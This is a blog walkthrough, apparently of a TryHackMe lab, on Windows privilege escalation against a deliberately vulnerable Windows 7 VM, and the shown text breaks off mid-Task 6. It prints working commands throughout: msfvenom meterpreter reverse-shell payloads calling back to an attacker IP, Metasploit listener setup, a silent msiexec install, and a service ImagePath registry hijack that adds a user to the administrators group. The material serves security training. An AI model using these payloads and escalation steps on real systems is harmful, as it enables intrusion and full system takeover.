<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="Windows PrivEsc Arena" /><meta property="og:locale" content="en_US" /><meta name="description" content="Windows PrivEsc Arena Students will learn how to escalate privileges using a very vulnerable Windows 7 VM. RDP is open." /><meta property="og:description" content="Windows PrivEsc Arena Students will learn how to escalate privileges using a very vulnerable Windows 7 VM. RDP is open." /><link rel="canonical" href="https://nananan.github.io/posts/windows-privesc-arena/" /><meta property="og:url" content="https://nananan.github.io/posts/windows-privesc-arena/" /><meta property="og:site_name" content="CinnamonSec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-03-30T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Windows PrivEsc Arena" /><meta name="twitter:site" content="@_cinnamon_92" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-08-06T17:51:49+02:00","datePublished":"2021-03-30T00:00:00+02:00","description":"Windows PrivEsc Arena Students will learn how to escalate privileges using a very vulnerable Windows 7 VM. RDP is open.","headline":"Windows PrivEsc Arena","mainEntityOfPage":{"@type":"WebPage","@id":"https://nananan.github.io/posts/windows-privesc-arena/"},"url":"https://nananan.github.io/posts/windows-privesc-arena/"}</script><title>Windows PrivEsc Arena | CinnamonSec</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-4NBRMHJVCG"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-4NBRMHJVCG'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/favicon.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">CinnamonSec</a></div><div class="site-subtitle font-italic">Cyber Security interested.<br> Rubber Ducks lover.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/rust-art/" class="nav-link"> <i class="fa-fw fas fa-paint-brush ml-xl-3 mr-xl-3 unloaded"></i> <span>RUST ART</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/nananan" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/_cinnamon_92" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['eliana-c','live.it'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Windows PrivEsc Arena</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Windows PrivEsc Arena</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Eliana Cannella </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Mar 30, 2021, 12:00 AM +0200" prep="on" > Mar 30, 2021 <i class="unloaded">2021-03-30T00:00:00+02:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Aug 6, 2023, 5:51 PM +0200" prefix="Updated " > Aug 6, 2023 <i class="unloaded">2023-08-06T17:51:49+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="5273 words">29 min</span></div></div><div class="post-content"><h1 id="windows-privesc-arena">Windows PrivEsc Arena</h1><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/windows_privesc.png" alt="img-description" /></p><blockquote><p>Students will learn how to escalate privileges using a very vulnerable Windows 7 VM. RDP is open.</p></blockquote><h3 id="task-1---connecting-to-tryhackme-network"><span style="color: var(--link-color);">[Task 1] - Connecting to TryHackMe network</span></h3><p>You don’t need me to do this. We just connect in VPN to the TryHackMe network.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/meme/wink.jpg" width="30%" height="30%" /></p><h3 id="task-2---deploy-the-vulnerable-machine"><span style="color: var(--link-color);">[Task 2] - Deploy the vulnerable machine</span></h3><blockquote><p>This room will teach you a variety of Windows privilege escalation tactics, including kernel exploits, DLL hijacking, service exploits, registry exploits, and more. This lab was built utilizing Sagi Shahar’s privesc workshop (https://github.com/sagishahar/lpeworkshop) and utilized as part of The Cyber Mentor’s Windows Privilege Escalation Udemy course (http://udemy.com/course/windows-privilege-escalation-for-beginners).</p><p>All tools needed to complete this course are on the user desktop (C:\Users\user\Desktop\Tools).</p><p>Let’s first connect to the machine. RDP is open on port 3389. Your credentials are:</p><p>username: user password: password321</p><p>For any administrative actions you might take, your credentials are:</p><p>username: TCM password: Hacker123</p></blockquote><h4 id="1-deploy-the-machine-and-log-into-the-user-account-via-rdp">1. Deploy the machine and log into the user account via RDP</h4><p>We click <strong>Start Machine</strong> on the challenge page and wait that the machine deploy. And then, we login in RDP by using the given credentials.</p><p>I use <strong>rdesktop</strong> to connect in RDP:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>rdesktop -u user -p "password321" $IP -g 90%
</pre></table></code></div></div><h4 id="2-open-a-command-prompt-and-run-net-user-who-is-the-other-non-default-user-on-the-machine">2. Open a command prompt and run ‘net user’. Who is the other non-default user on the machine?</h4><p>By run <strong>net user</strong> in a command prompt we retrieve the users on the machine: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/net_user.png" alt="Net User" /></p><p>And the other non-default user is <strong>TCM</strong>.</p><h3 id="task-3---registry-escalation---autorun-"><span style="color: var(--link-color);">[Task 3] - Registry Escalation - Autorun </span></h3><p>In this task, we use <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">Autorun</a> utility that is used to set auto-starting programs upon boot.</p><blockquote><p>Detection</p><p>Windows VM</p><ol><li>Open command prompt and type: C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe<li>In Autoruns, click on the ‘Logon’ tab.<li>From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.<li>In command prompt type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu “C:\Program Files\Autorun Program”<li>From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file.</ol><p>Exploitation</p><p>Kali VM</p><ol><li>Open command prompt and type: msfconsole<li>In Metasploit (msf &gt; prompt) type: use multi/handler<li>In Metasploit (msf &gt; prompt) type: set payload windows/meterpreter/reverse_tcp<li>In Metasploit (msf &gt; prompt) type: set lhost [Kali VM IP Address]<li>In Metasploit (msf &gt; prompt) type: run<li>Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe<li>Copy the generated file, program.exe, to the Windows VM.</ol><p>Windows VM</p><ol><li>Place program.exe in ‘C:\Program Files\Autorun Program’.<li>To simulate the privilege escalation effect, logoff and then log back on as an administrator user.</ol><p>Kali VM</p><ol><li>Wait for a new session to open in Metasploit.<li>In Metasploit (msf &gt; prompt) type: sessions -i [Session ID]<li>To confirm that the attack succeeded, in Metasploit (msf &gt; prompt) type: getuid</ol></blockquote><h5 id="detection">Detection</h5><p>We use the <strong>Autorun64.exe</strong> tools to view the programs that are configured to start automatically: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task3/autorun_myprogram.png" alt="AutoRuns" /></p><p>And we note that there is the <strong>MyProgram</strong> program (lol, what a tongue twister) that has, as Image Path, <strong>C:\Program Files\Autorun Program\program.exe</strong>.</p><p>The idea is to replace the program.exe with some other file containing a malicious payload. To do this, we need to ensure that we have the permissions, so we use the <strong>accesschk64</strong> tool:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task3/accesschk64_program.png" alt="accesschk64" /></p><p>From this, we note that the <strong>Everyone</strong> user group has <strong>FILE_ALL_ACCESS</strong> permission on the program.exe file.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task3/meme.jpg" alt="Meme" /></p><h5 id="exploitation">Exploitation</h5><p>Now that we have detected the vulnerability, we can exploit it by replacing the program.exe with a reverse shell.</p><p>First of all, we create a listener by using metasploit: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task4/msf_multihandle.png" alt="Msf_multihandler_conf" /></p><p>Then, we generate the payload with our reverse shell:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.8.80.159 -f exe -o program.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: program.exe
</pre></table></code></div></div><p>We must copy the evil payload in the victim machine (we can upload the file by using a python server or FTP or whatever you want).</p><p>And we move the program.exe in the folder <strong>C:\Program Files\AutoRun Program</strong>: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task4/move_program" alt="Move program.exe" /></p><p>Now, we must simulate the access of the administrator, in this way, the <strong>My Program</strong> program will be executed automatically and our malicious “program.exe” will be executed. Indeed, after we connect as administrator by using the following command:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>rdesktop -u TCM -p "Hacker123" $IP -g 90%
</pre></table></code></div></div><p>We come back to our metasploit listener and we get the shell: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task3/msf_TCM_access.png" alt="Msf_Access" /></p><h3 id="task-4---registry-escalation---alwaysinstallelevated-"><span style="color: var(--link-color);">[Task 4] - Registry Escalation - AlwaysInstallElevated </span></h3><p><a href="https://docs.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated">AlwaysInstallElevated</a> policy is used to install a Windows Installer package with elevated (system)privilege. Indeed, this policy grants full administrative rights, so low-privilege users can run installations with elevated privileges, for this reason, this method can make a machine vulnerable.</p><p>To check the vulnerability, we must check that the following registry has the <strong>AlwaysInstallElevated</strong> value set to 1:</p><ul><li>HKLM\Software\Policies\Microsoft\Windows\Installer<li>HKCU\Software\Policies\Microsoft\Windows\Installer</ul><p><a href="https://en.wikipedia.org/wiki/Windows_Registry">Windows Registry</a> is a hierarchical database that stores low-level settings for the Operating System and for applications that opt to use the registry. The registry contains two basic elements: <strong>keys</strong> and <strong>values</strong>. Registry keys are container objects similar to folders. Registry values are non-container objects similar to files. Keys may contain values and subkeys.</p><p>The command <strong>reg query</strong> returns a list of the next tier of subkeys and entries that are located under a specified subkey in the registry. In particular, in this case, we would obtain information about two of seven predefined root keys HKEY_LOCAL_MACHINE and HKEY_CURRENT_USER.</p><ul><li><strong>HKLM</strong> or <strong>HKEY_LOCAL_MACHINE</strong> stores settings that are specific to the local computer<li><strong>HKCU</strong> or <strong>HKEY_CURRENT_USER</strong> stores settings that are specific to the currently logged-in user</ul><blockquote><p>Detection</p><p>Windows VM</p><ol><li>Open command prompt and type: reg query HKLM\Software\Policies\Microsoft\Windows\Installer<li>From the output, notice that “AlwaysInstallElevated” value is 1.<li>In command prompt type: reg query HKCU\Software\Policies\Microsoft\Windows\Installer<li>From the output, notice that “AlwaysInstallElevated” value is 1.</ol><p>Exploitation</p><p>Kali VM</p><ol><li>Open command prompt and type: msfconsole<li>In Metasploit (msf &gt; prompt) type: use multi/handler<li>In Metasploit (msf &gt; prompt) type: set payload windows/meterpreter/reverse_tcp<li>In Metasploit (msf &gt; prompt) type: set lhost [Kali VM IP Address]<li>In Metasploit (msf &gt; prompt) type: run<li>Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi<li>Copy the generated file, setup.msi, to the Windows VM.</ol><p>Windows VM</p><p>1.Place ‘setup.msi’ in ‘C:\Temp’. 2.Open command prompt and type: msiexec /quiet /qn /i C:\Temp\setup.msi</p><p>Enjoy your shell! :)</p></blockquote><h5 id="detection-1">Detection</h5><p>How we said before, we check the <strong>AlwaysInstallElevated</strong> value of the two interested registries:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task4/always_enabled_register.png" alt="AlwaysInstallElevated" /></p><h5 id="exploitation-1">Exploitation</h5><p>The idea of the exploitation in this challenge is to replace the <strong>setup.msi</strong> in the <strong>C:\Temp</strong> with a malicious file. In this way, when we use the <code class="language-plaintext highlighter-rouge">msiexec</code> command (that is used for installing MSI and MSP packages) we can execute our file and obtain the system access.</p><p>To exploit this vulnerability, on our Kali Machine we set a metasploit listener needed to obtain a reverse shell: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task4/msf_multihandle.png" alt="Msf Multihandle" /></p><p>We generate the malicious payload:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.8.80.159 -f msi -o setup.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of msi file: 159744 bytes
Saved as: setup.msi
</pre></table></code></div></div><p>Now, we upload the payload in the victim machine and we move it in <strong>C:\Temp</strong>: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task4/dir_setup_msi.png" alt="Dir setup.msi" /></p><p>Then, we run the command <code class="language-plaintext highlighter-rouge">msiexec /quiet /qn /i C:\Temp\setup.msi</code> and, by returning in our metasploit listener, we get the system access: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task4/always_install_access.png" alt="System Access" /></p><h3 id="task-5---service-escalation---registry-"><span style="color: var(--link-color);">[Task 5] - Service Escalation - Registry </span></h3><p>This task use misconfiguration in the Windows registry like Task4. But in this case, we have permission to add keys in the HKLM registry by using the regsvc service.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task5/meme.jpg" width="40%" height="40%" /></p><blockquote><p>Detection</p><p>Windows VM</p><ol><li>Open powershell prompt and type: Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl<li>Notice that the output suggests that user belong to “NT AUTHORITY\INTERACTIVE” has “FullContol” permission over the registry key.</ol><p>Exploitation</p><p>Windows VM</p><ol><li>Copy ‘C:\Users\User\Desktop\Tools\Source\windows_service.c’ to the Kali VM.</ol><p>Kali VM</p><ol><li>Open windows_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add<li>Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_service.c -o x.exe (NOTE: if this is not installed, use ‘sudo apt install gcc-mingw-w64’)<li>Copy the generated file x.exe, to the Windows VM.</ol><p>Windows VM</p><ol><li>Place x.exe in ‘C:\Temp’.<li>Open command prompt at type: reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f<li>In the command prompt type: sc start regsvc<li>It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators</ol></blockquote><h5 id="detection-2">Detection</h5><p>Since we want to use the <strong>regsvc</strong> service, we check the permission that users have to access some resource. To do this, we use the <strong>Get-Acl</strong> command of PowerShell:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task5/task5_registry.png" alt="Get-Acl" /></p><p>From the output of <strong>Get-Acl</strong> command, we note that the user belongs to the <strong>NT AUTHORITY\SYSTEM</strong> group (from the line <code class="language-plaintext highlighter-rouge">Group</code> row) and, also, that this group has <strong>Full Control</strong> permission over the given registry key (from <code class="language-plaintext highlighter-rouge">Access</code> row).</p><h5 id="exploitation-2">Exploitation</h5><p>Since in the Windows machine there are some tools already uploaded, we downloaded on our Kali machine the source code in <strong>C:\Users\User\Desktop\Tools\Source\windows_service.c</strong>. Then, we must change the code to insert the malicious code <code class="language-plaintext highlighter-rouge">cmd.exe /k net localgroup administrators user /add</code>. So, basically, we must change the <strong>Run</strong> function:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task5/modify_code.png" alt="Source Code" /></p><p>And then, we compile the source code (you may need to install <code class="language-plaintext highlighter-rouge">gcc-mingw-w64</code>):</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>x86_64-w64-mingw32-gcc windows_service.c -o x.exe
</pre></table></code></div></div><p>With this command, we generate the <strong>x.exe</strong> file and we upload it to the Windows machine and copy in <strong>C:\Temp</strong> (this folder is fully accessible to our user):</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task5/task5_upload_payload.png" alt="Copy x.exe" /></p><p>To execute the file exe that we upload, we need to add its path in a new key in the registry by running the command:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
</pre></table></code></div></div><p>With the <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-add">reg add</a> we add a new registry entry, in particular:</p><ul><li><strong>HKLM\SYSTEM\CurrentControlSet\services\regsvc</strong> is the full path of the subkey to be added<li><strong>/v Image Path</strong> is the name of the add registry entry<li><strong>/t REG_EXPAND_SZ</strong> is the type for the registry entry<li><strong>/d c:\temp\x.exe</strong> is the data for the new registry entry (in this case, in our malicious file)<li><strong>/f</strong> is needed to add the registry entry without prompting for confirmation</ul><p>And finally, we start the <strong>regsvc</strong> service. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task5/task5_execution.png" alt="Execution Task 5" /></p><p>To confirm the successful execution we check if the user is added to the local administrators’ group (that is the command that we have inserted in the <em>Run</em> function in the <em>windows_service.c</em> file):</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task5/administrator_user.png" alt="Administrator" /></p><h3 id="task-6---service-escalation---executable-files-"><span style="color: var(--link-color);">[Task 6] - Service Escalation - Executable Files </span></h3><p>If a user has to write permissions in a folder used by a service, then he can replace the binary with a malicious one. In this way, when the service is restarted, the malicious file will be executed.</p><blockquote><p>Detection</p><p>Windows VM</p><ol><li>Open command prompt and type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu “C:\Program Files\File Permissions Service”<li>Notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the filepermservice.exe file.</ol><p>Exploitation</p><p>Windows VM</p><ol><li>Open command prompt and type: copy /y c:\Temp\x.exe “c:\Program Files\File Permissions Service\filepermservice.exe”<li>In command prompt type: sc start filepermsvc<li>It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators</ol></blockquote><h5 id="detection-3">Detection</h5><p>To check the user permission of the <strong>“File Permissions Service”</strong> folder, we use our good friend <strong>accesschk64.exe</strong>: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task6/task6_detection.png" alt="accesschk64" /></p><p>We see that the <strong>Everyone</strong> group has <strong>FILE_ALL_ACCESS</strong> permission on the <strong>filepermservice.exe</strong> file, so we can replace this file with our malicious file.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task6/meme.jpg" width="40%" height="40%" /></p><h5 id="exploitation-3">Exploitation</h5><p>We can use our previously generated <strong>x.exe</strong> file. So, we replace the filepermservice.exe with our x.exe and execute it:</p><p><img 